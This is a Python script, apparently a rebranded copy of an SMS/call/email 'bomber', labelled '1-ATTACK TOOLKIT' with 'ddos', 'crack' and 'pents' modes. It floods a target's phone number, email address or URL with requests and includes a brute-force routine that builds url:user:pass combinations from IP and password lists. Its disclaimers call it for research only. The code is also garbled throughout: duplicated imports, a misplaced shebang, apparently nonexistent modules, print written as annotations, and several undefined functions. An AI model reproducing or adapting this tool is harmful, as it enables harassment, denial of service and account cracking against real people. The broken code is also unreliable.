import argparse
import os
import socket
import sys
import threading
import time
import urllib
from multiprocessing.dummy import Pool as ThreadPool

import tellabo
import knock
import requests
from proxylist import ProxyList as Proxy

#!/usr/bin/python

import ajg
import argparse
import json
import os
import random
import re
import sys
import tarfile
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests.utils
from utils.decorators import MessageDecorator
from utils.provider import APIProvider

try:
    from colorama import Fore, Style
except ImportError:
    print("\tSome dependencies could not be imported (possibly not installed)")
    print(
        "Type `pip3 install -r requirements.txt` to "
        " install all required packages")
    sys.exit(1)

proxyList = os.open(flags=int(10), path='tlds.txt')


def readisdc():
    with open("isdcodes.json") as file:
        isdcodes = json.load(file)
    return isdcodes


# noinspection PyBroadException
def get_version():
    try:
        return open(".version", "r").read().strip()
    except Exception:
        return '1.0'


def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


print(
    """

X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@
@@@@@&    @@@@@(    &X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@@@@@@@
@@@@      &@ ,@      @@@   &@ @,@(@   @%X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@
@@@@       (          @@@@@@@@@@@ @..@@.@    @@@@@@@@@@@@@@@@@@@@@@@@@
@@@@                  @@@@@@@@@@@ @  @  @    @@@@@@@@@@@@@@@@@@@@@@@@@
@@@                    @@@@@@@@@@& . ,#*. (X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>
@@@@        @@       .X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@@@@@@
@@@@@@    @@@@      @@@  @@@     &     @@,  @@@@   @@  @,  @@@@@@@@@@@
@@@@@@      @@      @@  ( @@@  @@@@  @@@% @  @  @@@@@    @@@@@@@@@@@@@
@@@@@@      @@      @  @@  @@  @@@@  @@@ @@@ .@    @@  @&  @@@@@@@@@@@
@@@@@@@     @@     X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@            X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X   NOLEP ARMY
@@@@@@@            X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@     TOOLKITS By Miftah45
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@

                [#] DoubleAttack thread - 1-ATTACK TOOLSKIT [#]
                            [NolepArmy Version v2.5]
                            [Author Name] : Miftah45

one-attack!!
""")


# noinspection PyBroadException,PyGlobalUndefined,PyTypeChecker
def findThreading():
    if len(sys.argv) < 2:
        print: "NO ARGS"
        return False
    thread_nr: int = int(sys.argv[1])
    queue = Queue()
    try:
        for i in range(thread_nr):
            t = brute(queue)
            t.daemon = True
            t.start()
            i += 1
    except Exception:
        print: '[!] Cant start more than '' threads!\n'

    global found

    with open(str(sys.argv[2]), 'rU') as ipf:
        ips = ipf.read().splitlines()
    with open(str(sys.argv[3]), 'rU') as pf:
        pf.read().splitlines()

    stiva = {}

    try:
        print: "\n[!] Creating url:user:pass combinations, patience please.\n"
        counter = 1
        ips_lungime = len(ips)
        countery = 0
        for ip in ips:
            ip = ip.lower()
            ip.replace('www.', '')
            stiva[ip] = dict()

            print: "\n Generating: combinations + fordomain + " + str[counter] + " / " + str[ips_lungime]
            counter = counter + 1

        print: "\n[!] Rearranging combinations for better use, patience please.\n"
        for k in range(0, countery):
            for ip in ips:
                try:
                    # print ip+","+stiva[ip][k]
                    split_string = stiva[ip][k].split(',', 2)
                    queue.put((ip, split_string[0], split_string[1]))
                    del stiva[ip][k]
                except Exception:
                    print('gagal looadng...')

        del stiva
        del k
        del ip
    # print "\n[!] Done creating url:user:pass combinations.\n"
    except Exception:
        print: "\n[!] Error creating url:user:pass combinations!\n"

    queue.join()
    Proxy()


def ddos_format():
    url = knock.host.replace('\n', '').replace('\r', '')
    op = tellabo.get('vpn.' + url + '/index/robots.txt', timeout=7)
    op2 = tellabo.get('vpn.' + url + '/home/index.php/cookie', timeout=7)
    # noinspection PyBroadException
    try:
        requests.utils.address_in_network(op, op2)
    except Exception:
        mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
        print()


# noinspection PyTypeChecker
def get_phone_info():
    while True:
        ""
        cc = input(requests.put(
            "Enter your country format url (example: .id): "))
        ddos_format()
        if not country_formats.get(cc, False):
            mesgdcrt.WarningMessage(
                "The country format ({cc}) that you have entered"
                " is invalid or unsupported".format(cc=cc))
            continue
        target = input(requests.url(
            "Enter the target url: +" + cc + " "))
        ddos_format()
        if 6 < len(target) < 12:
            return cc, target
        mesgdcrt.WarningMessage(
            "The phone url ({target})".format(target=target) +
            "that you have entered is invalid")


def get_pents_info():
    pents_regex = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'
    while True:
        target = input("Enter target pents: ")
        if not re.search(pents_regex, target, re.IGNORECASE):
            mesgdcrt.WarningMessage(
                "The pents ({target})".format(target=target) +
                " that you have entered is invalid")
            continue
        return target


def pretty_print(cc, target, success, failed):
    requested = success + failed
    mesgdcrt.SectionMessage("Bombing is in progress - Please be patient")
    mesgdcrt.GeneralMessage(
        "Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage("Target       : " + cc + " " + target)
    mesgdcrt.GeneralMessage("Sent         : " + str(requested))
    mesgdcrt.GeneralMessage("Successful   : " + str(success))
    mesgdcrt.GeneralMessage("Failed       : " + str(failed))
    mesgdcrt.WarningMessage(
        "This tool was made for fun and research purposes only")
    mesgdcrt.SuccessMessage("1-attackwas created by SpeedX")


def workernode(mode, cc, target, count, delay, max_threads):
    api = APIProvider(cc, target, mode, delay=delay)
    clr()
    mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
    mesgdcrt.GeneralMessage(
        "Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage("API Version   : " + api.api_version)
    mesgdcrt.GeneralMessage("Target        : " + cc + target)
    mesgdcrt.GeneralMessage("Amount        : " + str(count))
    mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
    mesgdcrt.GeneralMessage("Delay         : " + str(delay) +
                            " seconds")
    mesgdcrt.WarningMessage(
        "This tool was made for fun and research purposes only")
    print()
    input(requests.post(
        "Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it"))

    if len(APIProvider.api_providers) == 0:
        mesgdcrt.FailureMessage("Your country/target is not supported yet")
        mesgdcrt.GeneralMessage("Feel free to reach out to us")
        input(requests.get("Press [ENTER] to exit"))
        bann_text()
        sys.exit()

    success, failed = 0, 0
    while success < count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count - success):
                jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result is None:
                    mesgdcrt.FailureMessage(
                        "Bombing limit for your target has been reached")
                    mesgdcrt.GeneralMessage("Try Again Later !!")
                    input(requests.get("Press [ENTER] to exit"))
                    bann_text()
                    sys.exit()
                if result:
                    success += 1
                else:
                    failed += 1
                clr()
                pretty_print(cc, target, success, failed)
    print("\n")
    mesgdcrt.SuccessMessage("Bombing completed!")
    time.sleep(1.5)
    bann_text()
    sys.exit()


# noinspection PyBroadException
def selectnode(mode="ddos"):
    mode = mode.lower().strip()
    try:
        clr()
        bann_text()

        max_limit = {"ddos": 500, "crack": 15, "pents": 200}
        cc, target = "", ""
        if mode in ["ddos", "crack"]:
            cc, target = get_phone_info()
            if cc != "91":
                max_limit.update({"ddos": 100})
        elif mode == "pents":
            target = get_pents_info()
        else:
            raise KeyboardInterrupt

        limit = max_limit[mode]
        while True:
            try:
                message = ("Enter url of {type}".format(type=mode.upper()) +
                           " to send (Max {limit}): ".format(limit=limit))
                count = int(input(requests.url(message)).strip())
                if count > limit or count == 0:
                    mesgdcrt.WarningMessage("You have requested " + str(count)
                                            + " {type}".format(
                        type=mode.upper()))
                    mesgdcrt.GeneralMessage(
                        "Automaticracky capping the value"
                        " to {limit}".format(limit=limit))
                    count = limit
                delay = float(input(
                    mesgdcrt.CommandMessage("Enter delay time (in seconds): "))
                              .strip())
                # delay = 0
                max_thread_limit = (count // 10) if (count // 10) > 0 else 1
                max_threads = int(input(
                    mesgdcrt.CommandMessage(
                        f"Enter url of Thread (Recommended: {max_thread_limit}): "))
                                  .strip())
                max_threads = max_threads if (
                        max_threads > 0) else max_thread_limit
                if count < 0 or delay < 0:
                    raise Exception
                break
            except KeyboardInterrupt as ki:
                raise ki
            except Exception:
                mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
                print()

        workernode(mode, cc, target, count, delay, max_threads)
    except KeyboardInterrupt:
        mesgdcrt.WarningMessage("Received INTR crack - Exiting...")
        sys.exit()


mesgdcrt = MessageDecorator("icon")

try:
    country_codes = readisdc()["isdcodes"]
except FileNotFoundError:
    update()

__VERSION__ = get_version()
__CONTRIBUTORS__ = ['SpeedX', 't0xic0der', 'scpketer', 'Stefan']

ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE,
              Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
RESET_ALL = Style.RESET_ALL

ASCII_MODE = False
DEBUG_MODE = False

description = """1-attack- Your Friendly Spammer Application

1-attackcan be used for many purposes which incudes -
\t Exposing the vulnerable APIs over Internet
\t Friendly Spamming
\t Testing Your Spam Detector and more ....

1-attackis not intented for malicious uses.
"""

parser = argparse.ArgumentParser(description=description,
                                 epilog='Coded by SpeedX !!!')
parser.add_argument("-sms", "--sms", action="store_true",
                    help="start 1-attackwith SMS Bomb mode")
parser.add_argument("-call", "--call", action="store_true",
                    help="start 1-attackwith CALL Bomb mode")
parser.add_argument("-mail", "--mail", action="store_true",
                    help="start 1-attackwith MAIL Bomb mode")
parser.add_argument("-ascii", "--ascii", action="store_true",
                    help="show only characters of standard ASCII set")
parser.add_argument("-u", "--update", action="store_true",
                    help="update TBomb")
parser.add_argument("-c", "--contributors", action="store_true",
                    help="show current 1-attackcontributors")
parser.add_argument("-v", "--version", action="store_true",
                    help="show current 1-attackversion")

if __name__ == "__main__":
    args = parser.parse_args()
    if args.ascii:
        ASCII_MODE = True
        mesgdcrt = MessageDecorator("stat")
    if args.version:
        print("Version: ", __VERSION__)
    elif args.contributors:
        print("Contributors: ", " ".join(__CONTRIBUTORS__))
    elif args.update:
        update()
    elif args.mail:
        selectnode(mode="mail")
    elif args.call:
        selectnode(mode="call")
    elif args.sms:
        selectnode(mode="sms")
    else:
        choice = ""
        avail_choice = {
            "1": "ddos",
            "2": "crack",
            "3": "pents"
            # "SILAHKAN ISI TARGET URL / BUG UTAMA ANDA"
            #     "YANG INGIN KALIAN BANGUNKAN"
        }
        try:
            while choice not in avail_choice:
                clr()
                bann_text()
                findThreading()
                print("Available Options:\n")
                for key, value in avail_choice.items():
                    print("[ {key} ] {value} BOMB".format(key=key,
                                                          value=value))
                print()
                choice = input("Enter Your Choice: ")
            selectnode(mode=avail_choice[choice].lower())
        except KeyboardInterrupt:
            mesgdcrt.WarningMessage("Received INTR crack - Exiting...")
            sys.exit()
    sys.exit()
